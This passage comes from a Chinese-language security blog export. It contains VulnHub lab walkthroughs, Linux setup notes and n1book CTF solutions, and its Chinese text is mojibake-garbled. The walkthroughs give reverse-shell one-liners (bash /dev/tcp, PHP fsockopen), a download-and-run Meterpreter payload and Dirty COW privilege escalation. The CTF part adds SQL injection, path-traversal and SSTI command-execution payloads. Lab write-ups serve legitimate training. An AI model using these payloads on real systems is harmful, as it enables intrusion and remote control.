<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230517201832.png"></p>
<p>get root</p>
<h2 id="domdom"><a href="#domdom" class="headerlink" title="domdom"></a>domdom</h2><p>ä¿¡æ¯æœé›†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.158.0/24 -sn</span><br></pre></td></tr></table></figure>

<p>ç›®æ ‡é¶æœº 192.168.158.158</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.158.158 -Pn </span><br></pre></td></tr></table></figure>

<p>dirsearchæ‰«ä¸€ä¸‹ï¼Œå‘ç°</p>
<p>index.php,admin.php</p>
<p>åœ¨index.php ç•Œé¢è¾“å…¥ï¼ŒæŠ“åŒ…ï¼Œå‘åŒ…å‘ç°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello User, Please fill in the login credentials as well as your name for tracking purposes.</span><br></pre></td></tr></table></figure>

<p>å°†è¯·æ±‚å¤´æ”¹ä¸ºadmin.php</p>
<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605194544.png"></p>
<p>ä¼ å…¥å‚æ•°cmd,è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œåå¼¹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh -i &gt;&amp; /dev/tcp/192.168.158.129/5000 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>è¿›è¡Œurlç¼–ç å‘åŒ…æ— ååº”ï¼Œç½‘ç«™æ˜¯ä½¿ç”¨php,æ‰€ä»¥ç”¨phpåå¼¹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.158.129&quot;,5000);exec(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>

<p>ç¼–ç å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.158.129%22%2C5000%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27</span><br></pre></td></tr></table></figure>

<p>getshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="msfææƒ"><a href="#msfææƒ" class="headerlink" title="msfææƒ"></a>msfææƒ</h3><p>é¦–å…ˆç”Ÿæˆmsfçš„æœ¨é©¬</p>
<p>kaliæ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.158.129 LPORT=7777 -f elf &gt; payload.elf</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿›å…¥msf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set payload php/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set lhost 0.0.0.0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set lport 7777</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>é¶æœºæ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp;wget http://192.168.158.129/payload.elf</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 777 payload.elf</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./payload.elf</span><br></pre></td></tr></table></figure>

<p>è¿æ¥æˆåŠŸï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search suggester</span><br><span class="line">use 0</span><br><span class="line">show options</span><br><span class="line">set session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605202303.png"></p>
<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605202357.png"></p>
<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605202709.png"></p>
<p>ä½¿ç”¨ç¬¬ä¸€ä¸ªï¼Œå¥½åƒæˆåŠŸäº†ï¼Œä½†åç»­å¤±è´¥äº†</p>
<p>åç»­ä½¿ç”¨ç¬¬äºŒä¸ªï¼ŒæˆåŠŸ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/linux/local/bpf_sign_extension_priv_esc</span><br><span class="line">show options</span><br><span class="line">set session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605204112.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /home/domom/Desktop/README.md</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605204353.png"></p>
<p>å¯†ç ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mj7AGmPR-m&amp;Vf&gt;Ry&#123;&#125;LJRBS5nc+*V.#a</span><br></pre></td></tr></table></figure>

<h3 id="è„ç‰›ææƒ"><a href="#è„ç‰›ææƒ" class="headerlink" title="è„ç‰›ææƒ"></a>è„ç‰›ææƒ</h3><p>è¿˜æ˜¯è¿™å°é¶æœºï¼Œç»§ç»­ç”¨ï¼Œ</p>
<p>æ¢æµ‹è„šæœ¬å¦‚ä¸‹ï¼Œè¿è¡Œå¯ä»¥çœ‹åˆ°</p>
<p><a href="https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh">https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh</a></p>
<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605215241.png"></p>
<p>é¦–å…ˆkali,ä¸‹è½½</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://www.exploit-db.com/download/40616</span><br><span class="line">mv 40616 cowroot.c</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>

<p>é¶æœºï¼Œè¿›è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.158.129/cowroot.c</span><br><span class="line">gcc cowroot.c -o cowroot -pthread</span><br><span class="line">chmod +x cowroot</span><br><span class="line">./cowroot</span><br></pre></td></tr></table></figure>

<p>è¿‡ç¨‹ä¸­ä¼šæŠ¥é”™ï¼Œä½†ä¸ç”¨ç®¡</p>
<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605211415.png"></p>
]]></content>
      <tags>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>linuxé—®é¢˜</title>
    <url>/2023/03/17/linux/</url>
    <content><![CDATA[<p>linuxä½¿ç”¨é‡è§çš„é—®é¢˜</p>
   <span id="more"></span>

<p>ä¸çŸ¥é“ä»€ä¹ˆåŸå› kaliä¸‹æ— æ³•å®‰è£…opensslåº“äºæ˜¯ä¸‹è½½äº†ubuntu</p>
<p>ä¸€ä¸‹æ˜¯é‡åˆ°çš„ä¸€äº›é—®é¢˜</p>
<h2 id="å®ç°Ubuntuä¸Windowsä¹‹é—´çš„å¤åˆ¶ç²˜è´´"><a href="#å®ç°Ubuntuä¸Windowsä¹‹é—´çš„å¤åˆ¶ç²˜è´´" class="headerlink" title="å®ç°Ubuntuä¸Windowsä¹‹é—´çš„å¤åˆ¶ç²˜è´´"></a>å®ç°Ubuntuä¸Windowsä¹‹é—´çš„å¤åˆ¶ç²˜è´´</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get autoremove open-vm-tools	//å¸è½½å·²æœ‰çš„å·¥å…·</span><br><span class="line">sudo apt-get install open-vm-tools		//å®‰è£…å·¥å…·open-vm-tools</span><br><span class="line">sudo apt-get install open-vm-tools-desktop  //å®‰è£…open-vm-tools-desktop</span><br><span class="line">reboot       //é‡å¯Ubuntuç³»ç»Ÿ</span><br></pre></td></tr></table></figure>

<p>å®‰è£…åŸºæœ¬è½¯ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨å‘½ä»¤sudo apt install build-essentialï¼Œè¯¥å‘½ä»¤å°†å®‰è£…ä¸€å †æ–°åŒ…ï¼ŒåŒ…æ‹¬gccï¼Œg ++å’Œmake</span><br></pre></td></tr></table></figure>



<h2 id="å®‰è£…-opensslåº“"><a href="#å®‰è£…-opensslåº“" class="headerlink" title="å®‰è£… opensslåº“"></a>å®‰è£… opensslåº“</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install libssl-dev</span><br></pre></td></tr></table></figure>

<p>å¼€å¯ubuntuçš„å¤§é—¨ï¼Ÿ</p>
<h2 id="centos7"><a href="#centos7" class="headerlink" title="centos7"></a>centos7</h2><p>å®‰è£…å›¾å½¢åŒ–é¡µé¢</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum groupinstall &quot;X Window System&quot;</span><br><span class="line">yum groupinstall -y &quot;GNOME Desktop&quot;</span><br><span class="line">su</span><br><span class="line">init 5  //è¿›å…¥å›¾å½¢åŒ–é¡µé¢</span><br></pre></td></tr></table></figure>

<p>å®‰è£…apaechæœåŠ¡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -qa httpd   #æ£€éªŒæœ‰æ²¡æœ‰httpd</span><br><span class="line">yum install httpd* -y   #å®‰è£…</span><br><span class="line">systemctl start httpd.service #å¯åŠ¨</span><br><span class="line">systemctl stop httpd.service #åœæ­¢æœåŠ¡</span><br><span class="line">systemctl status httpd.service #æŸ¥çœ‹çŠ¶æ€</span><br></pre></td></tr></table></figure>

<p>å®‰è£…mysql</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -i -c http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install mysql57-community-release-el7-10.noarch.rpm</span><br></pre></td></tr></table></figure>

<p>å®‰è£…mysqlæœåŠ¡å¥½åƒä¼šæŠ¥é”™ï¼Œä¸‹é¢æ˜¯æŠ¥é”™å†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">warning: /var/cache/yum/x86_64/7/mysql57-community/packages/mysql-community-libs-compat-5.7.41-1.el7.x86_64.rpm: Header V4 RSA/SHA256 Signature, key ID 3a79bd29: NOKEY</span><br><span class="line">Retrieving key from file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql</span><br><span class="line">The GPG keys listed for the &quot;MySQL 5.7 Community Server&quot; repository are already installed but they are not correct for this package.</span><br><span class="line">Check that the correct key URLs are configured for this repository.</span><br><span class="line"> Failing package is: mysql-community-libs-compat-5.7.41-1.el7.x86_64</span><br><span class="line"> GPG Keys are configured as: file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql</span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ°è§£å†³æ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022  //å…ˆæ‰§è¡Œè¿™ä¸ª</span><br><span class="line">yum -y install mysql-community-server  ///å†å®‰è£…</span><br></pre></td></tr></table></figure>

<p>å®‰è£…å®Œæ¯•ï¼Œå¼€å§‹ä½¿ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start  mysqld.service  #æ‰“å¼€mysql</span><br><span class="line">systemctl status mysqld.service   #æ£€æŸ¥çŠ¶æ€</span><br><span class="line">grep &quot;password&quot; /var/log/mysqld.log  //æŸ¥æ‰¾æš‚æ—¶rootå¯†ç </span><br><span class="line">mysql -uroot -p  #ç™»å½•å¯†ç </span><br><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;new password&#x27;;  #ä¿®æ”¹å¯†ç éœ€è¦å­—ç¬¦å¤§å°å†™æ•°å­—</span><br></pre></td></tr></table></figure>

<p>xshellä¼ è¾“æ–‡ä»¶å‘ç°æ²¡æœ‰æƒé™ ï¼Œèµ‹äºˆæƒé™å³å¯ä¼ è¾“æˆåŠŸ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/www</span><br><span class="line">chmod 777 html</span><br></pre></td></tr></table></figure>

<h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3><p>å¼€å¯ï¼Œå…³æœºï¼Œé‡å¯ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start nginx</span><br><span class="line">systemctl stop nginx</span><br><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure>

<h2 id="æŸ¥çœ‹ç«¯å£"><a href="#æŸ¥çœ‹ç«¯å£" class="headerlink" title="æŸ¥çœ‹ç«¯å£"></a>æŸ¥çœ‹ç«¯å£</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -anp</span><br><span class="line">æˆ–è€…</span><br><span class="line">netstat -tln</span><br></pre></td></tr></table></figure>

<p>bind to :::9999: Address already in use. QUITTING.</p>
<p>è§£å†³æ–¹æ³•</p>
<p><code>1.æ‰¾åˆ°å ç”¨è¿›ç¨‹ï¼š netstat -nap | grep ç«¯å£</code></p>
<p>kill pid</p>
<h2 id="å…³é—­socket-è¿æ¥"><a href="#å…³é—­socket-è¿æ¥" class="headerlink" title="å…³é—­socket è¿æ¥"></a>å…³é—­socket è¿æ¥</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -t  //å‘½ä»¤ç”¨äºæ˜¾ç¤ºç½‘ç»œçŠ¶æ€ã€‚</span><br><span class="line">kill pid  </span><br></pre></td></tr></table></figure>





]]></content>
  </entry>
  <entry>
    <title>n1book</title>
    <url>/2023/03/10/n1book/</url>
    <content><![CDATA[<p>buu n1book</p>
<p>â€‹    <span id="more"></span></p>
<h2 id="ç¬¬ä¸€ç« -webå…¥é—¨-å¸¸è§çš„æœé›†"><a href="#ç¬¬ä¸€ç« -webå…¥é—¨-å¸¸è§çš„æœé›†" class="headerlink" title="[ç¬¬ä¸€ç«  webå…¥é—¨]å¸¸è§çš„æœé›†"></a>[ç¬¬ä¸€ç«  webå…¥é—¨]å¸¸è§çš„æœé›†</h2><p>dirserachå¤šæ‰«å‡ éå°±å‡ºæ¥äº†</p>
<p>robots.txt</p>
<p>index.php~</p>
<p>.index.php.swp</p>
<p>å¾—åˆ°n1book{info_1s_v3ry_imp0rtant_hack}</p>
<h2 id="ç¬¬ä¸€ç« -webå…¥é—¨-ç²—å¿ƒçš„å°æ"><a href="#ç¬¬ä¸€ç« -webå…¥é—¨-ç²—å¿ƒçš„å°æ" class="headerlink" title="[ç¬¬ä¸€ç«  webå…¥é—¨]ç²—å¿ƒçš„å°æ"></a>[ç¬¬ä¸€ç«  webå…¥é—¨]ç²—å¿ƒçš„å°æ</h2><p>gitæ³„éœ²</p>
<p>æ²¡æœ‰æƒé™</p>
<p><code>python GitHack.py http://2d7694d7-c42f-4c1d-951d-f94169586055.node4.buuoj.cn:81/.git/</code></p>
<p>ç”Ÿæˆä¸€ä¸ªindex.htmlæ–‡ä»¶æ‰“å¼€å³æœ‰flag</p>
<p><a href="https://github.com/tigert1998/GitHack-py3">GitHub - tigert1998&#x2F;GitHack-py3: A <code>.git</code> folder disclosure exploit</a></p>
<p><code>n1book&#123;git_looks_s0_easyfun&#125;</code></p>
<h2 id="ç¬¬ä¸€ç« -webå…¥é—¨-SQLæ³¨å…¥-1"><a href="#ç¬¬ä¸€ç« -webå…¥é—¨-SQLæ³¨å…¥-1" class="headerlink" title="[ç¬¬ä¸€ç«  webå…¥é—¨]SQLæ³¨å…¥-1"></a>[ç¬¬ä¸€ç«  webå…¥é—¨]SQLæ³¨å…¥-1</h2><p>sqlmapè·‘ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://ca5e0c2e-0c4c-4721-8147-134b93b3e81d.node4.buuoj.cn:81/index.php?id=1 -D note -T fl4g --dump</span><br></pre></td></tr></table></figure>

<p>æ‰‹åŠ¨æ³¨å…¥</p>
<p>åˆ¤æ–­é—­åˆæ–¹å¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; and 1 = 1--+</span><br><span class="line">id=1&#x27; and 1 = 2--+ //é¡µé¢ç¬¬äºŒä¸ªå‡ºç°é€»è¾‘æŠ¥é”™  </span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥é—­åˆæ–¹å¼å¦‚ä¸Šï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; order by 3 --+</span><br><span class="line">id=1&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>

<p>æŸ¥æŸ¥çœ‹å½“å‰æ•°æ®åº“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27; union select 1,2,group_concat(schema_name) from (information_schema.schemata)--+-</span><br></pre></td></tr></table></figure>

<p>çˆ†è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure>

<p>çˆ†åˆ—</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;fl4g&#x27;--+</span><br></pre></td></tr></table></figure>

<p>çˆ†å­—æ®µ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27; union select 1,2,group_concat(fllllag) from (fl4g)--+</span><br></pre></td></tr></table></figure>

<h2 id="ç¬¬ä¸€ç« -webå…¥é—¨-SQLæ³¨å…¥-2"><a href="#ç¬¬ä¸€ç« -webå…¥é—¨-SQLæ³¨å…¥-2" class="headerlink" title="[ç¬¬ä¸€ç«  webå…¥é—¨]SQLæ³¨å…¥-2"></a>[ç¬¬ä¸€ç«  webå…¥é—¨]SQLæ³¨å…¥-2</h2><p>æŠ¥é”™æ³¨å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="ç¬¬ä¸€ç« -webå…¥é—¨-afr-1-1"><a href="#ç¬¬ä¸€ç« -webå…¥é—¨-afr-1-1" class="headerlink" title="[ç¬¬ä¸€ç«  webå…¥é—¨]afr_1 1"></a>[ç¬¬ä¸€ç«  webå…¥é—¨]afr_1 1</h2><p> ä»»æ„æ–‡ä»¶è¯»å–å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p=php://filter/convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>

<p>n1book{afr_1_solved}</p>
<h2 id="ç¬¬ä¸€ç« -webå…¥é—¨-afr-2"><a href="#ç¬¬ä¸€ç« -webå…¥é—¨-afr-2" class="headerlink" title="[ç¬¬ä¸€ç«  webå…¥é—¨]afr_2"></a>[ç¬¬ä¸€ç«  webå…¥é—¨]afr_2</h2><p>ç›®å½•ç©¿é€æ¼æ´</p>
<p>æ‰“å¼€æºç å‘ç°ç…§ç‰‡</p>
<p><code>http://60eef043-945c-47a4-aee5-4ec00836a80e.node4.buuoj.cn:81/img../</code></p>
<p><code>n1book&#123;afr_2_solved&#125;</code></p>
<h2 id="ç¬¬ä¸€ç« -webå…¥é—¨-afr-3"><a href="#ç¬¬ä¸€ç« -webå…¥é—¨-afr-3" class="headerlink" title="[ç¬¬ä¸€ç«  webå…¥é—¨]afr_3"></a>[ç¬¬ä¸€ç«  webå…¥é—¨]afr_3</h2><p>Linuxç³»ç»Ÿä¸Šçš„&#x2F;procç›®å½•æ˜¯ä¸€ç§æ–‡ä»¶ç³»ç»Ÿï¼Œå³procæ–‡ä»¶ç³»ç»Ÿã€‚ä¸å…¶å®ƒå¸¸è§çš„æ–‡ä»¶ç³»ç»Ÿä¸åŒçš„æ˜¯ï¼Œ&#x2F;procæ˜¯ä¸€ç§ä¼ªæ–‡ä»¶ç³»ç»Ÿï¼ˆä¹Ÿå³è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼‰ï¼Œå­˜å‚¨çš„æ˜¯å½“å‰å†…æ ¸è¿è¡ŒçŠ¶æ€çš„ä¸€ç³»åˆ—ç‰¹æ®Šæ–‡ä»¶ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡è¿™äº›æ–‡ä»¶æŸ¥çœ‹æœ‰å…³ç³»ç»Ÿç¡¬ä»¶åŠå½“å‰æ­£åœ¨è¿è¡Œè¿›ç¨‹çš„ä¿¡æ¯ï¼Œç”šè‡³å¯ä»¥é€šè¿‡æ›´æ”¹å…¶ä¸­æŸäº›æ–‡ä»¶æ¥æ”¹å˜å†…æ ¸çš„è¿è¡ŒçŠ¶æ€ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../../../../proc/self/cmdline</span><br></pre></td></tr></table></figure>

<p>è·å¾—å½“å‰æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=../../../../../proc/self/cwd/server.py</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">from flask import ( Flask, render_template, request, url_for, redirect, session, render_template_string )</span><br><span class="line">from flask_session import Session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">execfile(&amp;#39;flag.py&amp;#39;)</span><br><span class="line">execfile(&amp;#39;key.py&amp;#39;)</span><br><span class="line">FLAG = flag</span><br><span class="line">app.secret_key = key</span><br><span class="line">@app.route(&amp;#34;/n1page&amp;#34;, methods=[&amp;#34;GET&amp;#34;, &amp;#34;POST&amp;#34;])</span><br><span class="line">def n1page():</span><br><span class="line">    if request.method != &amp;#34;POST&amp;#34;:</span><br><span class="line">        return redirect(url_for(&amp;#34;index&amp;#34;))</span><br><span class="line">    n1code = request.form.get(&amp;#34;n1code&amp;#34;) or None</span><br><span class="line">    if n1code is not None:</span><br><span class="line">        n1code = n1code.replace(&amp;#34;.&amp;#34;, &amp;#34;&amp;#34;).replace(&amp;#34;_&amp;#34;, &amp;#34;&amp;#34;).replace(&amp;#34;&#123;&amp;#34;,&amp;#34;&amp;#34;).replace(&amp;#34;&#125;&amp;#34;,&amp;#34;&amp;#34;)</span><br><span class="line">    if &amp;#34;n1code&amp;#34; not in session or session[&amp;#39;n1code&amp;#39;] is None:</span><br><span class="line">        session[&amp;#39;n1code&amp;#39;] = n1code</span><br><span class="line">    template = None</span><br><span class="line">    if session[&amp;#39;n1code&amp;#39;] is not None:</span><br><span class="line">        template = &amp;#39;&amp;#39;&amp;#39;&amp;lt;h1&amp;gt;N1 Page&amp;lt;/h1&amp;gt; &amp;lt;div class=&amp;#34;row&amp;gt; &amp;lt;div class=&amp;#34;col-md-6 col-md-offset-3 center&amp;#34;&amp;gt; Hello : %s, why you don&amp;#39;t look at our &amp;lt;a href=&amp;#39;/article?name=article&amp;#39;&amp;gt;article&amp;lt;/a&amp;gt;? &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;#39;&amp;#39;&amp;#39; % session[&amp;#39;n1code&amp;#39;]</span><br><span class="line">        session[&amp;#39;n1code&amp;#39;] = None</span><br><span class="line">    return render_template_string(template)</span><br><span class="line"></span><br><span class="line">@app.route(&amp;#34;/&amp;#34;, methods=[&amp;#34;GET&amp;#34;])</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&amp;#34;main.html&amp;#34;)</span><br><span class="line">@app.route(&amp;#39;/article&amp;#39;, methods=[&amp;#39;GET&amp;#39;])</span><br><span class="line">def article():</span><br><span class="line">    error = 0</span><br><span class="line">    if &amp;#39;name&amp;#39; in request.args:</span><br><span class="line">        page = request.args.get(&amp;#39;name&amp;#39;)</span><br><span class="line">    else:</span><br><span class="line">        page = &amp;#39;article&amp;#39;</span><br><span class="line">    if page.find(&amp;#39;flag&amp;#39;)&amp;gt;=0:</span><br><span class="line">        page = &amp;#39;notallowed.txt&amp;#39;</span><br><span class="line">    try:</span><br><span class="line">        template = open(&amp;#39;/home/nu11111111l/articles/&#123;&#125;&amp;#39;.format(page)).read()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        template = e</span><br><span class="line"></span><br><span class="line">    return render_template(&amp;#39;article.html&amp;#39;, template=template)</span><br><span class="line"></span><br><span class="line">if __name__ == &amp;#34;__main__&amp;#34;:</span><br><span class="line">    app.run(host=&amp;#39;0.0.0.0&amp;#39;, debug=False)</span><br></pre></td></tr></table></figure>

<p>è·å¾—keyå†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â€¦/â€¦/â€¦/â€¦/â€¦/proc/self/cwd/key.py</span><br></pre></td></tr></table></figure>

<p>Drmhze6EPcv0fN_81Bj-nA</p>
<p>å¯¹session è¿›è¡Œè§£å¯† {â€˜n1codeâ€™: None}</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;n1code&#x27;: &#x27;&#123;&#123;\&#x27;\&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\&#x27;os\&#x27;].popen(\&#x27;cat flag.py\&#x27;).read()&#125;&#125;&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>åŠ å¯†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.eJwdikEKgCAQAL8SXlYvQl2CviKxbGoRmCtZhxD_nnUbZqaI2Ft2XkyiFACNaAPljNjoOBnRDHPDfC-_961IZcb-k3vcr3_cAi8UWjLAGWadOPkowdLVrYE2nR5Q-vTkpKpV1BcrHygP.ZG78Ww.IgYFkdMt9PmRCBIMzQqjnCYH1y8</span><br></pre></td></tr></table></figure>

<h2 id="ç¬¬äºŒç« -webè¿›é˜¶-SSRF-Training"><a href="#ç¬¬äºŒç« -webè¿›é˜¶-SSRF-Training" class="headerlink" title="[ç¬¬äºŒç«  webè¿›é˜¶]SSRF Training"></a>[ç¬¬äºŒç«  webè¿›é˜¶]SSRF Training</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="variable">$match_result</span>=<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>); </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$url_parse</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line">    <span class="variable">$ip</span>=<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$hostname</span>); </span><br><span class="line">    <span class="variable">$int_ip</span>=<span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip</span>); 